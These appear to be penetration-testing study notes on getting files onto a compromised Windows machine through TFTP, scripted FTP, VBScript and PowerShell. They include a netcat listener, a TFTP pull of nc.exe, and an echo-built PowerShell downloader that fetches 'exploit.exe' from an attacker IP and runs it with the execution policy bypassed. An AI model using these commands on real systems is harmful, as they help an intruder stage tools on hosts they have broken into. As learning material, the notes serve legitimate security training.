# File Transfers


* Limit the commands on target machine to be non-interactive

## TFTP Transfers

* UDP
  * XP -2003 contained TFTP client by default
* Not ideal
* Mostly non-interactive

`nc -nlvp 443`

`atftpd --daemon --port 69 /tftp`

copy windows version of netcat to /tftp

Invoke tftp client on windows box.

`tftp -i <IP> GET nc.exe`

## FTP

Windows have a default FTP client.  However, the client is interactive.

* supports scripted commands
  * `ftp -s`

Attacker side:
1. Set up FTP side
2. create a file with commands.  will be automatically invoked when pasted into target host
Target side:
1. Paste commands into ftp command line

## VBScript Transfers
Using VBScript
* same concept, use echo to put commands on command line


`cscript wget.vbs <URL>/local_file`


## Powershell Transfers

Use non-interactive commands and paste them on windows CLI

powershell-download

```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://<IP>/exploit.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```

Then run powershell:
`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
